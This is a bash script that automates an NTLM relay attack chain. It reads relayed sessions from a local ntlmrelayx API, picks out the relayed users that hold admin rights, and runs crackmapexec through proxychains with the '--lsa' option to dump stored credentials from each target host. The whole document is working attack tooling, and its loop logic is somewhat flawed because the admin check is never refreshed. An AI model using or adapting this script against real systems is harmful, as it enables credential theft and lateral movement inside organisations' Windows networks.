action="lsa"

page="$(wget --quiet 'http://localhost:9090/ntlmrelayx/api/v1.0/relays')"
cat relays | python -m json.tool > relays_beautify

ip_loc=4
username_loc=5
admin_loc=6

domain=$(sed -n "${username_loc}p" < relays_beautify | sed 's/"//g' | sed 's/,//g' | sed 's/\/.*//' | sed 's/ //g')
ip=$(sed -n "${ip_loc}p" < relays_beautify | sed 's/"//g' | sed 's/,//g' | sed 's/ //g')
admin=$(sed -n "${admin_loc}p" < relays_beautify | sed 's/"//g' | sed 's/,//g' | sed 's/ //g')
username=$(sed -n "${username_loc}p" < relays_beautify | sed 's/"//g' | sed 's/,//g' | sed "s/$domain//g" | sed "s/\///g")

if [[ $admin == "FALSE" ]]; then
    echo $username is not an admin on $ip
else
    proxychains cme smb -u $username -p \"\" -d $domain $ip --$action
fi

while [ -n "${ip}" ]
do
    let "ip_loc=ip_loc + 7"
    let "username_loc=username_loc + 7"
    ip=$(sed -n "${ip_loc}p" < relays_beautify | sed 's/"//g' | sed 's/,//g' | sed 's/ //g')    
    username=$(sed -n "${username_loc}p" < relays_beautify | sed 's/"//g' | sed 's/,//g' | sed "s/$domain//g" | sed "s/\///g")
    if [[ $admin == "FALSE" ]]; then
        echo $username is not an admin on $ip
    else
        proxychains cme smb -u $username -p \"\" -d $domain $ip --$action
    fi
done

rm relays_beautify relays